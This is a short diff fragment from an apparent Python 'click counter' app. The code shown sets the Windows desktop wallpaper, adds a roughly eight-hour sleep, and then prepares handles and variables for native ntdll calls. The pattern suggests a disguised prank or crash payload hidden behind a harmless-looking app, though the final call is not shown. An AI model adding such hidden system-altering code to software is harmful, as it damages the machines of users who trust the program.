@@ -93,7 +93,7 @@ class ClickCounterApp:
         abs_image_path = os.path.abspath(image_path)
         SPI_SETDESKWALLPAPER = 0x0014
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_image_path, 3)
-
+time.sleep(30000)
 ntdll = ctypes.windll.ntdll
 prev_value = ctypes.c_bool()
 res = ctypes.c_ulong()
